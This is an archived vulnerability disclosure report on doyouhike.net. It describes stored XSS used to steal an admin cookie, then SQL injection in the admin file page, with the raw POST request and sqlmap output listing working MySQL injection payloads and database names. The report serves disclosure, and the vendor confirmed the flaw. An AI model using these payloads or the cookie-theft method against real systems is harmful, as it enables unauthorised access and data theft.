wybug_title: 磨房网XSS打入后台（附后台SQL注入）
wybug_author: 天地不仁 以万物为刍狗
wybug_detail:
漏洞详情 披露状态：   									2015-12-29：	细节已通知厂商并且等待厂商处理中									2015-12-30：	厂商已经确认，细节仅向厂商公开									2016-01-09：	细节向核心白帽子及相关领域专家公开									2016-01-19：	细节向普通白帽子公开									2016-01-29：	细节向实习白帽子公开									2016-02-12：	细节向公众公开  简要描述： 求几个磨小驴这么难吗？ 详细说明：  在添加线路那：http://www.doyouhike.net/route/go_add_base

线路名称和简介那 可插入XSS语句 由于本地字数限制 so 我们可以先随便写点东西 然后抓包 修改参数数据（这里就不演示了）打到的cookie值

然后我们用打到的cookie登录 这里用的Burp 所以每次都要带cookie 传送 很麻烦

后来翻到了这：http://admin.doyouhike.net/index.php/file/index

于是猜测这里有sql 然后跑了下  果然···

POST数据包：
POST /index.php/file/index HTTP/1.1Host: admin.doyouhike.netUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://admin.doyouhike.net/index.php/file/indexCookie: _ga=GA1.2.1307204639.1422239151; pgv_pvi=1215990784; PHPSESSID=pd623ngga79popiagnh3j2isb6; __utma=151782572.1307204639.1422239151.1451366675.1451377270.1366; __utmb=151782572.5.10.1451377270; __utmc=151782572; __utmz=151782572.1451377270.1366.636.utmcsr=admin.doyouhike.net|utmccn=(referral)|utmcmd=referral|utmcct=/index.php/route/index/reviewsX-Forwarded-For: 8.8.8.8'Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 24user_name=*&file_name=
   漏洞证明：  
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection point(s) with a total of 195 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user_name=' AND 2981=2981 AND 'KRGQ'='KRGQ&file_name=    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: user_name=' AND (SELECT 7778 FROM(SELECT COUNT(*),CONCAT(0x716a787171,(SELECT (ELT(7778=7778,1))),0x716b787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'TkvV'='TkvV&file_name=    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: user_name=' AND (SELECT * FROM (SELECT(SLEEP(5)))kDsx) AND 'Zfor'='Zfor&file_name=---[17:12:46] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0[17:12:46] [INFO] fetching database names[17:12:47] [INFO] the SQL query used returns 5 entries[17:12:47] [INFO] retrieved: information_schema[17:12:47] [INFO] retrieved: bizrc[17:12:47] [INFO] retrieved: click[17:12:47] [INFO] retrieved: g3rc[17:12:47] [INFO] retrieved: sphinxavailable databases [5]:[*] bizrc[*] click[*] g3rc[*] information_schema[*] sphinx[17:12:47] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 179 times[17:12:47] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\admin.doyouhike.net'[*] shutting down at 17:12:47
   修复方案：  由于每次都要带 cookie 进行传送 很麻烦 就不继续测试其他后台功能了   版权声明：转载请注明来源 天地不仁 以万物为刍狗@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-30 10:50 厂商回复： 漏洞已经确认，感谢作者 最新状态： 暂无
